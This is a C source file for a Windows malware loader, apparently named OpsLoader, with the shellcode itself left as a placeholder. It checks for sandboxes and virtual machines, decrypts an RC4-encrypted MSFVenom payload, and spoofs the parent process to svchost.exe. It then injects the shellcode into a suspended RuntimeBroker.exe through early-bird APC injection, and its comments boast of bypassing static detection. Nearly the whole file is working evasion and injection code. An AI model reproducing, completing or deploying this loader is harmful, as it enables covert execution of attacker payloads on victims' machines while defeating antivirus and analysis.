#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

int main(void)
{
	if (!antivirt1()) { return -1; }
	if (!antivirt2()) { return -1; }
	if (!antivirt3()) { return -1; }

	// Encrypted MSFVenom Shellcode that bypasses static detection
	unsigned char Payload[] = "%%DATA%%";
	DWORD PayloadSize = sizeof(Payload) - 1;
	unsigned char Rc4Key[] = "\x31"; // "1"; is the same as "\x31"; which is the same as { 0x30 };
	DWORD KeySize = sizeof(Rc4Key) - 1;

	printf("[*] Decrypting data...\n");
	// Pass in the data to out helper function
	if (!Rc4DecryptionViaSystemFunc032(Rc4Key, Payload, KeySize, PayloadSize)) {
		printf("[!] Decryption failed.\n");
	}
	
	printf("Getting Handle to Specified Parent Process...\n");
	// Setting variables for the target parent process
	LPCSTR targetProcessName = "svchost.exe";
	printf("Using %s\n", targetProcessName);
	DWORD targetParentProcessPID;
	HANDLE targetParentProcessHandle;
	// Obtain Parent Process Handle
	// Pass the args for the last 2 as pointers because these will be modified and returned
	if (GetProcessHandle(targetProcessName, &targetParentProcessPID, &targetParentProcessHandle) != 0)
	{
		printf("[!] GetProcessHandle Failed! Exiting!\n");
		return -1;
	}

	printf("Creating PPID Spoofed Process...\n");
	// Setting variables for the process to be created
	unsigned char lpProcessName[] = "RuntimeBroker.exe";
	DWORD dwProcessId;
	HANDLE hProcess;
	HANDLE hThread;
	// Created Spoofed PPID Process by passing in parent process handle, and the process to be created variables
	CreatePPidSpoofedProcess(targetParentProcessHandle, lpProcessName, &dwProcessId, &hProcess, &hThread);

	// create payload, payloadsize, and empty pointer which will be updated with location of allocated memory for payload in the remote process
	printf("[i] Injecting shellcode into spoofed remote process... \n");
	PVOID pAddress; // This will be the pointer to the memory region containing payload
	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, PayloadSize, &pAddress)) // pAddress is returned / modified directly to be updated with allocated region address
	{
		printf("[!] InjectShellcodeToRemoteProcess Failed With Error: %d\n", GetLastError());
		return -1;
	}

	printf("[i] Running Apc Injection Function ... \n");
	if (!RunViaApcInjection(hThread, pAddress)) {
		return -1;
	}
	printf("[*] Done!\n");

	return 0;
}

int NotDmmyFnc(void) {

	// dummy code
	int		j = rand();
	int		i = j + rand();
	double num1 = 19;
	double num2 = 73;
	char operator = '-';

	switch (operator) {
	case '+':
		printf("%.2lf + %.2lf = %.2lf\n", num1, num2, num1 + num2);
		break;
	case '-':
		printf("%.2lf - %.2lf = %.2lf\n", num1, num2, num1 - num2);
		break;
	case '*':
		printf("%.2lf * %.2lf = %.2lf\n", num1, num2, num1 * num2);
		break;
	case '/':
		if (num2 != 0)
			printf("%.2lf / %.2lf = %.2lf\n", num1, num2, num1 / num2);
		else
			printf("Error: Division by zero\n");
		break;
	default:
		printf("Invalid operator\n");
	}

	return 0;

}

// Anti-Virtualization 1; Check if name of binary is OpsLoader.exe
BOOL antivirt1(void)
{
	char lpFilename[MAX_PATH];
	DWORD nSize = sizeof(lpFilename);
	GetModuleFileNameA(NULL, &lpFilename, nSize); // retrieves the path of the executable file of the current process, OUT Saves to the lpFilename variable, IN specifies the size of lpFilename (how much room GetModuleFileNameA has to work with)
	LPSTR exepath = PathFindFileNameA(lpFilename); // Searches a path for a file name. Returns a pointer to the base name of the executable from the full path.
	if (strcmp(exepath, "OpsLoader.exe") != 0)
	{
		NotDmmyFnc();
		return FALSE;
	}
	return TRUE;
}

// Anti-Virtualization 2; Check if the amount of running process is less than 60
BOOL antivirt2(void)
{
	DWORD dwProcesses[1024]; // create array for PIDs
	DWORD ProcessArrayBytesReturned; // # of bytes returned in to the array
	if (!EnumProcesses(dwProcesses, sizeof(dwProcesses), &ProcessArrayBytesReturned))
	{
		printf("[!] EnumProcesses Failed With Error: %d\n", GetLastError());
		return FALSE;
	}
	if (dwProcesses == ProcessArrayBytesReturned) // Microsoft says if lpcbNeeded == cb, then not all the PIDs were able to fit in the array
	{
		printf("[!] Not all PIDs fit in to the array!\n");
		return FALSE;
	}
	DWORD dwProcessCount = ProcessArrayBytesReturned / sizeof(DWORD);

	if (dwProcessCount < 60)
	{
		printf("Less than 60!\n");
		NotDmmyFnc();
		return FALSE;
	}
	return TRUE;
}

// Anti-Virtualization 3; Checking to see if sandbox fast forward
BOOL antivirt3(void)
{
	typedef NTSTATUS(__stdcall* fnNtDelayExecution)(
		BOOLEAN              Alertable,
		PLARGE_INTEGER       DelayInterval
		);

	HMODULE hModule = GetModuleHandleA("NTDLL.DLL");
	PVOID pAddress = GetProcAddress(hModule, "NtDelayExecution");
	fnNtDelayExecution pNtDelayExecution = (fnNtDelayExecution)pAddress;

	// According to MSFT docs on LARGE_INTEGER structure this is a 64bit signed integer. We only are required to put the desired value in the QuadPart member of the structure.
	LARGE_INTEGER delayInterval;
	delayInterval.QuadPart = 5 * 1000 * 10000 * -1; // This is equal to 5s. This is the amount of 100ns intervals. We added the * -1 because Negative values: Indicate relative time, i.e., the thread will be delayed for the specified time from the current moment. Positive values : Indicate absolute time, meaning the system will wait until the specific time(in system ticks) is reached.

	DWORD T0 = GetTickCount64();
	NTSTATUS STATUS = pNtDelayExecution(FALSE, &delayInterval); // Delay
	if (STATUS != 0x00 && STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	DWORD T1 = GetTickCount64(); // Ending time
	if ((T1 - T0) < 4.9) // Calculate Starting - Ending
	{
		printf("Failed\n");
		return FALSE;
	}
	return TRUE;
}

BOOL Rc4DecryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	typedef struct
	{
		DWORD	Length;
		DWORD	MaximumLength; // Typically same as length
		PVOID	Buffer;

	} USTRING; // Define USTRING structure to be used in fnSystemFunction032. Will also be used when defining the data and key vars to pass in

	typedef NTSTATUS(NTAPI* fnSystemFunction032)
		(
			struct USTRING* Data, // Structure of type USTRING that holds information about the buffer to encrypt or decrypt 
			struct USTRING* Key   // Structure of type USTRING that holds information about the key used for encryption or decryption
			); // Create our function pointer which we will call fnSystemFunction032


	NTSTATUS STATUS = NULL;

	USTRING Data = {
		.Length = sPayloadSize, // Parameter name from function
		.MaximumLength = sPayloadSize, // Typically same as length
		.Buffer = pPayloadData  // Pass in pointer to data
	}; // Create our Data variable using the USTRING structure

	USTRING	Key = {
		.Length = dwRc4KeySize,
		.MaximumLength = dwRc4KeySize,
		.Buffer = pRc4Key
	}; // Create our Key variable using the USTRING structure

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032"); // Create our variable SystemFunction032 which is a function pointer to the function

	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) // Pass in our data and key we defined, as a pointer to the variable, because that is how it is defined in the function pointer fnSystemFunction032. 
		// Simultaneously do an if statement on it.
	{
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[*] Success! Payload Decrypted!\n");
	return TRUE;
};

int GetProcessHandle(LPCSTR targetProcessName, DWORD* targetProcessPID, HANDLE* targetProcessHandle)
{
	DWORD aProcesses[1024]; // create array for PIDs
	// IF I CHANGE this to LPDWORD and remove the & from line 26, and in line 39 add a *ProcessArrayBytesReturned, the program fails.
	DWORD ProcessArrayBytesReturned = NULL; // # of bytes returned in to the array. Setting as pointer because required by EnumProcesses to be one.
	// Run EnumProcesses to return all process PIDs as an array
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &ProcessArrayBytesReturned))
	{
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if (aProcesses == ProcessArrayBytesReturned) // Microsoft says if lpcbNeeded == cb, then not all the PIDs were able to fit in the array
	{
		printf("[!] Not all PIDs fit in to the array!\n");
		return -1;
	}

	// Count # of processes returned
	DWORD dwProcessCount = ProcessArrayBytesReturned / sizeof(DWORD); //We had to dereference since it is a pointer 
	printf("[*] Number Of Processes Detected: %d\n", dwProcessCount);

	// Next let's iterate through the array and use OpenProcess
	int i;
	for (i = 0; i < dwProcessCount; i++) // iterate through each individual process
	{
		HANDLE hProcess;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i]);
		if (hProcess != NULL)
		{
			// If we successfully got a handle to a process, we can start getting info about it & eventually the name
			HMODULE hModule;
			DWORD ModuleArrayBytesReturned = NULL; // IF I CHANGE this to LPDWORD and line 55 to remove the &, the program fails.

			// If handle is valid
			// Get a handle of a module in the process 'hProcess'
			// The module handle is needed for 'GetModuleBaseName'
			if (EnumProcessModules(hProcess, &hModule, sizeof(hModule), &ModuleArrayBytesReturned))
			{
				// If EnumProcessModules succeeded
				// Get the name of 'hProcess' and save it in the 'szProc' variable 
				WCHAR	szProcessName[MAX_PATH];
				if (GetModuleBaseName(hProcess, hModule, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)))
				{
					// If GetModuleBaseName succeeded, print out the name
					wprintf(L"[%0.3d] Process \"%s\" - Of Pid : %d \n", i, szProcessName, aProcesses[i]);
					if (_stricmp(targetProcessName, szProcessName) == 0) {
						// Print the target process was found
						printf("[+] FOUND target process: \"%s\" - Of Pid: %d\n", targetProcessName, aProcesses[i]);
						// Return by reference
						*targetProcessPID = aProcesses[i]; // Return the target process' PID
						*targetProcessHandle = hProcess; // Return a handle to the target process
						break;
					}
				}


			}

			// Close process handle after we retrieve the info
			CloseHandle(targetProcessHandle);
		}
	}

	// If target process was not found, quit
	if (i == dwProcessCount)
	{
		printf("Process not found\n");
		return -1;
	}

	printf("DONE!\n");
	return 0;
}

BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR                               lpPath[MAX_PATH * 2];
	CHAR                               lpBasePath[MAX_PATH * 2];
	CHAR                               WnDr[MAX_PATH];

	SIZE_T                             sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA                     SiEx = { 0 };
	PROCESS_INFORMATION                Pi = { 0 };

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	sprintf_s(lpPath, sizeof(lpPath), "%s\\System32\\%s -Embedding", WnDr, lpProcessName); // Spoofing RuntimeBroker.exe
	sprintf_s(lpBasePath, sizeof(lpBasePath), "%s\\system32", WnDr); // To be used with RuntimeBroker.exe

	//sprintf_s(lpPath, sizeof(lpPath), "%s\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca", WnDr); // Spoofing SearchApp.exe
	//sprintf_s(lpBasePath, sizeof(lpBasePath), "%s\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\", WnDr); // To be used with SearchApp.exe


	//-------------------------------------------------------------------------------

	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// Allocating enough memory locally to store attributes list for to be created process
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Update PPID attribute; This is where the spoofing happens
	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	//-------------------------------------------------------------------------------

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, // Now supports Early Bird APC Injection since we are also creating it as SUSPENDED
		NULL,
		lpBasePath, // Set this to "C:\\Windows\\system32" (was originally NULL). This is technically optional but better for PPID Spoofing OPSEC. See step 8 above. We actually ended up setting this to use an environment variable so it's even better than hardcoding
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] New process created with PID: %d\n", Pi.dwProcessId);
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;


	// Cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pAddress)
{


	SIZE_T  sNumberOfBytesWritten = NULL;
	DWORD   dwOldProtection = NULL;


	*pAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*pAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory in Remote Process At: 0x%p \n", *pAddress);


	if (!WriteProcessMemory(hProcess, *pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *pAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

BOOL RunViaApcInjection(IN HANDLE hThread, IN PVOID pAddress)
{

	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC(pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}
